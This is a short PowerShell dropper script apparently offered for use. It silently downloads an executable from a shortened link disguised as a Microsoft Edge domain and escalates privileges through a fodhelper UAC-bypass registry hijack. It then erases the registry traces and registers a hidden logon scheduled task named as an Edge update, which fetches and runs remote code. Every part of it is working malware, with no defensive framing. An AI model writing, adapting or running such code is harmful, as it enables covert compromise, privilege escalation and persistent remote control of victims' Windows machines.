# Sifu's "Single Instance" Check
if (Get-Process "MicrosoftEdgeUpdateUA" -ErrorAction SilentlyContinue) { exit }

# 1. Paths & Servers
# Your specific shortened GitHub Raw link
$url_exe = 'https://msedge.short.gy/FwVDAu'
$p = "$env:temp\MicrosoftEdgeUpdateUA.exe"

# 2. Silent Download
# Added -UserAgent to look like a standard browser request
irm $url_exe -OutFile $p -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# 3. Sifu UAC Bypass (Fodhelper Hijack)
$k = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
ni $k -Force | Out-Null
sp $k 'DelegateExecute' ''
sp $k '(default)' $p
fodhelper.exe

# 4. Wait for Elevation & Cleanup
Start-Sleep -s 10
ri 'HKCU:\Software\Classes\ms-settings' -Recurse -Force

# 5. Persistence (The "Edge Update" Ghost)
# Replace 'your-server-a.com' with the actual domain hosting this .ps1 script
$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -c `"irm https://msedge.short.gy/0Dztgk | iex`""
$t = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $a -Trigger $t -TaskName "MicrosoftEdgeUpdateTaskMachineUA" -Description "Microsoft Edge Update" -Force
